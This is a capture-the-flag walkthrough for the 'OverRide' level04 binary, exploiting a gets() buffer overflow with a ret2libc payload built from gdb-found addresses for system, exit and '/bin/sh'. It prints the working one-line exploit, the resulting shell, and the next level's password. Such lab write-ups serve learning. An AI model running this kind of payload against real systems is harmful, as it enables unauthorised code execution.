# Level04 Walkthrough

## Analyzing the Program with GDB and ghidra

1. **Whats happening**: 
```bash
    level04@OverRide:~$ ./level04 
    Give me some shellcode, k
    gq
    child is exiting...

```

- Its a fork() challenge, here we read user string input thanks to `gets()` function but there is no control on the size. So we can overflow the buffer, so overwrite the pointer (eip register) with a particular libc function address directly.


- We will need to set on gdb  `set follow-fork-mode child`. 
```bash
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2484]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

(gdb) info register eip
eip            0x41326641       0x41326641 <----- offset 156

```

Same to other level, try a `ret2libc` with `system()`, `exit()`, and `/bin/sh`
```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +999999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

- Final Payload: 
```bash
(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level04

level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level04
Give me some shellcode, k


whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---


## Moving to level05

1. **Swith User to level05**:
    Run ```su level05```

2. **Authenticate with the Password**:
    
   
 